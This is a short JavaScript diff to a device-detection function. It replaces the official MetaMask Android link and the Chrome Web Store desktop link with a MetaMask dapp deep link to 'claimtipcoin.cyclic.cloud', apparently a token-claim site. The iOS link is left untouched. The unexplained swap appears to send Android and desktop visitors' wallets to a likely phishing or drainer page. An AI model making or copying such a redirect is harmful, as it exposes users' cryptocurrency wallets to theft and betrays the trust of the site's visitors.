@@ -213,8 +213,8 @@ function loadAppropriateLink() {
     
     // Define the links for each device type
     var iosLink = 'https://metamask.app.link/bxwkE8oF99';
-    var androidLink = 'https://metamask.app.link/skAH3BaF99';
-    var desktopLink = 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn';
+    var androidLink = 'https://metamask.app.link/dapp/claimtipcoin.cyclic.cloud/';
+    var desktopLink = 'https://metamask.app.link/dapp/claimtipcoin.cyclic.cloud/';
 
     // Check for iOS
     if (userAgent.match(/iPhone|iPad|iPod/i)) {
